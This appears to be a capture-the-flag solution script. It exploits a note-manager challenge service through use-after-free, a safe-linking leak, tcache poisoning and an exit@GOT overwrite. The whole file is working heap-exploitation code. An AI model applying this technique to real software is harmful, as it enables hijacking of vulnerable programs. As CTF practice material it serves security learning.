import socket
import struct
import sys

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
s = socket.create_connection(("pwn.h7tex.com", 42589), timeout=15)


def rd(t=1.0, label=""):
    s.settimeout(t)
    buf = b""
    while True:
        try:
            c = s.recv(4096)
        except socket.timeout:
            break
        if not c:
            break
        buf += c
    print("  -> [%s] %r" % (label, buf[:160]))
    return buf


def go(x, label=""):
    s.sendall(x if isinstance(x, bytes) else x.encode())
    return rd(1.0, label)


rd(1.5, "banner")
go("1\n"); go("0\n", "add0 idx"); go(b"AAAA", "add0 note")
go("1\n"); go("1\n", "add1 idx"); go(b"BBBB", "add1 note")
go("2\n"); go("0\n", "del0")
go("4\n"); leak = go("0\n", "view0")
t = struct.unpack("<Q", leak[:8])[0]
print("  t = 0x%x  -> A ~ 0x%x" % (t, t << 12))
go("2\n"); go("1\n", "del1")
go("3\n"); go("1\n", "edit1 idx"); go(struct.pack("<Q", t ^ 0x404060), "edit1 fd")
go("1\n"); go("2\n", "add2 (lấy lại B)")
go("1\n"); go("3\n", "add3 (phải ra 0x404060)")
go("3\n"); go("3\n", "edit3 idx"); go(struct.pack("<Q", 0x4012B6), "edit3 ghi exit@GOT")
go("4\n"); v = go("3\n", "view3 = nội dung tại exit@GOT")
print("  exit@GOT giờ là:", v[:16].hex())
s.shutdown(socket.SHUT_WR)
print("  sau khi đóng hướng ghi:")
rd(4.0, "final")
s.close()
